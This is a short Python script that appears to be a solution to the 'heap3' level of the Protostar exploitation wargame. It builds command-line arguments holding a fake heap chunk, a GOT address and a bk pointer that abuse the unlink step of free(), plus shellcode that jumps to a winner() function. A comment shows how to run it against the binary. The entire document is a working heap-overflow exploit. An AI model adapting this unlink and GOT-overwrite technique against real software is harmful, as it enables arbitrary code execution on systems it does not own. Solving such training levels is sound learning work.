import struct
secondArg = "A" * 36 + "\x65"
fakeChunkSize = "\xfc\xff\xff\xff"
GOT = "\x1c\xb1\x04\x08" #0x804b128 - 12 = 0x0804b11c
bk = "\x14\xc0\x04\x08" #0x804c014
shellcode = "\xB8\x64\x88\x04\x08\xFF\xD0" #mov eax,winner  call eax
thirdArg = "A" * 92 + fakeChunkSize + fakeChunkSize + GOT + bk
firstArg = "A" * 12 + shellcode
exploit = firstArg + " " +  secondArg + " " + thirdArg
print exploit
#winner() = 0x8048864
#./heap3 `python /tmp/heap3.py`
